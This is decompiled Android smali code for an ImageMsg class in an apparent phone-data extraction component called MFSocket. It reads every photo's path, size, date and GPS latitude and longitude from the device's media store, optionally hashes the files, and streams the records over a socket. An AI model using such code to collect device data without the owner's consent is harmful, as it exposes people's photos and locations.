.class public Lcom/Android/MFSocket/ImageMsg;
.super Ljava/lang/Object;
.source "ImageMsg.java"


# instance fields
.field private m_context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 19
    iput-object p1, p0, Lcom/Android/MFSocket/ImageMsg;->m_context:Landroid/content/Context;

    .line 20
    return-void
.end method


# virtual methods
.method getImage(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 27
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "imgMsg"    # Ljava/lang/StringBuffer;
    .param p3, "nConfig"    # I

    .prologue
    .line 24
    const/4 v9, 0x0

    .line 25
    .local v9, "bNeedMD5":Z
    const/4 v10, 0x0

    .line 26
    .local v10, "bNeedThumbnail":Z
    packed-switch p3, :pswitch_data_0

    .line 43
    :goto_0
    const/4 v4, 0x7

    new-array v5, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    .line 47
    const-string v6, "title"

    aput-object v6, v5, v4

    const/4 v4, 0x1

    .line 48
    const-string v6, "_data"

    aput-object v6, v5, v4

    const/4 v4, 0x2

    .line 49
    const-string v6, "_size"

    aput-object v6, v5, v4

    const/4 v4, 0x3

    .line 50
    const-string v6, "mime_type"

    aput-object v6, v5, v4

    const/4 v4, 0x4

    .line 51
    const-string v6, "date_modified"

    aput-object v6, v5, v4

    const/4 v4, 0x5

    .line 52
    const-string v6, "latitude"

    aput-object v6, v5, v4

    const/4 v4, 0x6

    .line 53
    const-string v6, "longitude"

    .line 46
    aput-object v6, v5, v4

    .line 56
    .local v5, "columns":[Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/Android/MFSocket/ImageMsg;->m_context:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    .line 57
    .local v3, "contentResolver":Landroid/content/ContentResolver;
    sget-object v4, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    .line 58
    .local v12, "cursor":Landroid/database/Cursor;
    invoke-interface {v12}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-nez v4, :cond_1

    .line 141
    :cond_0
    :goto_1
    return-void

    .line 28
    .end local v3    # "contentResolver":Landroid/content/ContentResolver;
    .end local v5    # "columns":[Ljava/lang/String;
    .end local v12    # "cursor":Landroid/database/Cursor;
    :pswitch_0
    const/4 v9, 0x0

    .line 29
    const/4 v10, 0x0

    .line 30
    goto :goto_0

    .line 32
    :pswitch_1
    const/4 v9, 0x1

    .line 33
    const/4 v10, 0x0

    .line 34
    goto :goto_0

    .line 36
    :pswitch_2
    const/4 v9, 0x0

    .line 37
    const/4 v10, 0x1

    .line 38
    goto :goto_0

    .line 40
    :pswitch_3
    const/4 v9, 0x1

    .line 41
    const/4 v10, 0x1

    goto :goto_0

    .line 62
    .restart local v3    # "contentResolver":Landroid/content/ContentResolver;
    .restart local v5    # "columns":[Ljava/lang/String;
    .restart local v12    # "cursor":Landroid/database/Cursor;
    :cond_1
    const-wide/16 v21, 0x0

    .line 64
    .local v21, "size":J
    const-string v26, ""

    .line 65
    .local v26, "url":Ljava/lang/String;
    const-string v24, ""

    .line 66
    .local v24, "title":Ljava/lang/String;
    const-string v25, ""

    .line 67
    .local v25, "type":Ljava/lang/String;
    const-string v13, ""

    .line 70
    .local v13, "date":Ljava/lang/String;
    const-string v20, ""

    .line 72
    .local v20, "md5":Ljava/lang/String;
    invoke-interface {v12}, Landroid/database/Cursor;->getCount()I

    move-result v11

    .line 73
    .local v11, "counter":I
    if-lez v11, :cond_0

    .line 74
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v23

    .line 75
    .local v23, "strCount":Ljava/lang/String;
    move-object/from16 v0, p1

    move-object/from16 v1, v23

    invoke-static {v0, v1}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 81
    const/4 v15, 0x0

    .local v15, "j":I
    :goto_2
    if-lt v15, v11, :cond_2

    .line 138
    invoke-interface {v12}, Landroid/database/Cursor;->close()V

    .line 139
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p1

    invoke-static {v0, v4}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 140
    const/4 v4, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v4}, Ljava/lang/StringBuffer;->setLength(I)V

    goto :goto_1

    .line 83
    :cond_2
    :try_start_0
    const-string v4, "title"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v24

    .line 84
    const-string v4, "_data"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v26

    .line 85
    const-string v4, "_size"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v21

    .line 86
    const-string v4, "mime_type"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v25

    .line 87
    const-string v4, "date_modified"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 88
    const-string v4, "latitude"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getDouble(I)D

    move-result-wide v16

    .line 89
    .local v16, "latitude":D
    const-string v4, "longitude"

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v12, v4}, Landroid/database/Cursor;->getDouble(I)D
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-wide v18

    .line 91
    .local v18, "longitude":D
    if-eqz v9, :cond_3

    .line 92
    :try_start_1
    invoke-static/range {v26 .. v26}, Lcom/Android/MFSocket/MD5Msg;->fileMD5(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v20

    .line 113
    :goto_3
    move-object/from16 v0, v24

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 114
    move-object/from16 v0, v26

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 115
    move-wide/from16 v0, v21

    move-object/from16 v2, p2

    invoke-static {v0, v1, v2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(JLjava/lang/StringBuffer;)V

    .line 116
    move-object/from16 v0, v25

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 117
    move-object/from16 v0, p2

    invoke-static {v13, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 118
    move-wide/from16 v0, v16

    move-object/from16 v2, p2

    invoke-static {v0, v1, v2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(DLjava/lang/StringBuffer;)V

    .line 119
    move-wide/from16 v0, v18

    move-object/from16 v2, p2

    invoke-static {v0, v1, v2}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(DLjava/lang/StringBuffer;)V

    .line 120
    move-object/from16 v0, v20

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 121
    invoke-static/range {p2 .. p2}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 123
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    move-object/from16 v0, p1

    invoke-static {v0, v4}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 124
    const/4 v4, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v4}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 136
    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    .line 81
    add-int/lit8 v15, v15, 0x1

    goto/16 :goto_2

    .line 95
    :cond_3
    :try_start_2
    const-string v20, ""
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_3

    .line 97
    :catch_0
    move-exception v14

    .line 98
    .local v14, "e":Ljava/lang/Exception;
    :try_start_3
    const-string v20, ""
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    .line 100
    .end local v14    # "e":Ljava/lang/Exception;
    .end local v16    # "latitude":D
    .end local v18    # "longitude":D
    :catch_1
    move-exception v14

    .line 102
    .restart local v14    # "e":Ljava/lang/Exception;
    const-wide/16 v21, 0x0

    .line 103
    const-string v26, ""

    .line 104
    const-string v24, ""

    .line 105
    const-string v25, ""

    .line 106
    const-string v13, ""

    .line 107
    const-wide/16 v16, 0x0

    .line 108
    .restart local v16    # "latitude":D
    const-wide/16 v18, 0x0

    .line 109
    .restart local v18    # "longitude":D
    const-string v20, ""

    .line 110
    invoke-virtual {v14}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3

    .line 26
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
    .end packed-switch
.end method
